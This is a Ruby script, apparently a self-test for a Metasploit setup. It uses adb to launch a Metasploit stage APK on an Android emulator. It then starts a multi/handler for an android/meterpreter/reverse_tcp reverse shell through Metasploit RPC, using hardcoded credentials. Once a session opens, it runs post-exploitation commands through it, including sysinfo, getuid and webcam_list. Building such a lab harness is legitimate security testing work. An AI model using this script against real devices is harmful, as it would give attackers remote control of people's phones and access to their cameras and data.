puts "=== FULL SYSTEM TEST ==="

require 'msfrpc-client'
target_device = "127.0.0.1:5555" # MuMu
adb_host = ENV['ADB_HOST'] || '100.102.229.216'

puts "Target: #{target_device}"
puts "ADB Host: #{adb_host}"

# 1. Launch App
puts "\n[1] Launching Payload on Device..."
cmd = "adb -H #{adb_host} -s #{target_device} shell am start -n com.metasploit.stage/.MainActivity"
puts "Running: #{cmd}"
system(cmd)

puts "Waiting 15s for reverse connection..."
sleep 15

# 2. Connect MSF
puts "\n[2] Checking MSF Session..."
begin
  rpc = Msf::RPC::Client.new(
    host: ENV['RAILS_HOST'] || 'metasploit',
    port: 3333,
    uri: '/api/',
    ssl: true
  )
  rpc.login('cool', 'looc')
  
  # Ensure Handler is Running
  puts "Checking Jobs (Listeners)..."
  jobs = rpc.call('job.list')
  puts "Jobs: #{jobs.keys}"
  
  has_handler = jobs.values.any? { |j| j.include?('Multi-Handler') } # Check job name if possible, or just look for payload match
  # Actually job.list returns { "0" => "Exploit: multi/handler" }
  
  if jobs.values.include?("Exploit: multi/handler")
     puts "✅ Handler already running."
  else
     puts "⚠️ Starting Multi-Handler on 0.0.0.0:4444..."
     res = rpc.call('module.execute', 'exploit', 'multi/handler', {
       'PAYLOAD' => 'android/meterpreter/reverse_tcp',
       'LHOST' => '0.0.0.0',
       'LPORT' => 4444,
       'ExitOnSession' => false,
       'Job' => true
     })
     puts "Handler Start Result: #{res}"
     sleep 2
  end

  sessions = rpc.call('session.list')
  puts "Active Sessions: #{sessions.keys}"

  session_id = sessions.keys.first

  if session_id
    puts "✅ Session #{session_id} established! Starting Functional Tests..."
    
    # Define Tests
    tests = [
      'sysinfo',
      'getuid',
      'webcam_list',
      'ifconfig'
    ]
    
    tests.each do |cmd|
      puts "\n--- Test: #{cmd} ---"
      # Write Command
      rpc.call('session.meterpreter_write', session_id, cmd)
      
      # Read Output Loop
      output = ""
      3.times do 
        sleep 2
        res = rpc.call('session.meterpreter_read', session_id)
        # res is usually {"data"=>"output..."}
        if res && res['data'] && !res['data'].empty?
           output += res['data']
        end
      end
      
      if output.empty?
        puts "⚠️ No output received."
      else
        puts output.strip
        puts "✅ OK"
      end
    end
    
    puts "\n=== ALL TESTS COMPLETED ==="

  else
    puts "❌ No session established."
    puts "Troubleshoot: Check Firewall Port 4444 (Inbound). Check APK LHOST."
  end

rescue => e
  puts "❌ Error: #{e.message}"
  puts e.backtrace
end
